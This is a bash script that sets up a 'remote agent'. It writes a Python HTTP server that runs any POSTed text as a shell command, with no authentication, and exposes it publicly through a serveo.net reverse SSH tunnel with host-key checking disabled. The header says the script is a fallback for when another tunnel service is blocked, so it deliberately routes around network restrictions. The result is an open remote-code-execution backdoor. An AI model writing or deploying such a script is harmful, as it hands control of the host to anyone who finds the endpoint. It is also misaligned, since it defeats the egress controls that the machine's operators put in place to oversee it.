#!/usr/bin/env bash
# remote_agent_setup_serveo.sh
# Sets up a serveo.net SSH tunnel + Python command server for remote orchestration.
# Use when bore.pub is blocked (port 7835 unreachable). Requires SSH port 22 outbound.
# No binary downloads required — uses system SSH and Python3.

set -euo pipefail

SERVER_PORT=9000
SERVEO_LOG="${HOME}/.local/serveo-tunnel.log"
SERVER_LOG="/tmp/cmd_server.log"

# ── Kill any previous instances ───────────────────────────────────────────────
set +e
pkill -f "cmd_server.py"      2>/dev/null
pkill -f "ssh.*serveo.net"    2>/dev/null
fuser -k "${SERVER_PORT}/tcp" 2>/dev/null
set -e
sleep 1

# ── Write and start Python command server ─────────────────────────────────────
echo ">>> Starting command server on port ${SERVER_PORT}..."
cat > /tmp/cmd_server.py << 'PYEOF'
import http.server, subprocess, json, os

class CommandHandler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers["Content-Length"])
        cmd = self.rfile.read(length).decode()
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        body = json.dumps({
            "stdout": result.stdout,
            "stderr": result.stderr,
            "rc":     result.returncode,
        }).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *args):
        pass

http.server.HTTPServer(("127.0.0.1", 9000), CommandHandler).serve_forever()
PYEOF

python3 /tmp/cmd_server.py >"${SERVER_LOG}" 2>&1 &
SERVER_PID=$!
sleep 2

if ! kill -0 "${SERVER_PID}" 2>/dev/null; then
    echo "ERROR: Command server failed to start. Log:" >&2
    cat "${SERVER_LOG}" >&2
    exit 1
fi
echo "    Server PID: ${SERVER_PID} — OK"

# ── Open serveo tunnel and capture assigned port ──────────────────────────────
echo ">>> Opening serveo.net SSH tunnel..."
ssh -o StrictHostKeyChecking=no \
    -o ServerAliveInterval=30 \
    -o ServerAliveCountMax=3 \
    -NR "0:localhost:${SERVER_PORT}" \
    serveo.net >"${SERVEO_LOG}" 2>&1 &
TUNNEL_PID=$!

# Wait for serveo to print the assigned port (up to 15s)
for _ in $(seq 1 30); do
    if grep -q "Forwarding" "${SERVEO_LOG}" 2>/dev/null; then
        break
    fi
    sleep 0.5
done

if ! kill -0 "${TUNNEL_PID}" 2>/dev/null; then
    echo "ERROR: serveo tunnel failed to start. Log:" >&2
    cat "${SERVEO_LOG}" >&2
    exit 1
fi

# Serveo prints: "Forwarding TCP connections from tcp://serveo.net:XXXXX"
SERVEO_PORT=$(grep -oP '(?<=tcp://serveo\.net:)\d+' "${SERVEO_LOG}" 2>/dev/null \
    || grep -oP '\d{4,5}$' "${SERVEO_LOG}" 2>/dev/null | head -1 \
    || echo "")

echo "    Tunnel PID: ${TUNNEL_PID} — OK"
echo ""
echo "=========================================="
echo "  Remote agent ready (serveo)."
if [[ -n "${SERVEO_PORT}" ]]; then
    echo "  Orchestrator endpoint: serveo.net:${SERVEO_PORT}"
    echo ""
    echo "  Test with (via swgiweb):"
    echo "  ssh swgiweb \"curl -s -X POST http://serveo.net:${SERVEO_PORT} -d 'whoami'\""
else
    echo "  Could not detect port. Full log:"
    cat "${SERVEO_LOG}"
fi
echo "=========================================="
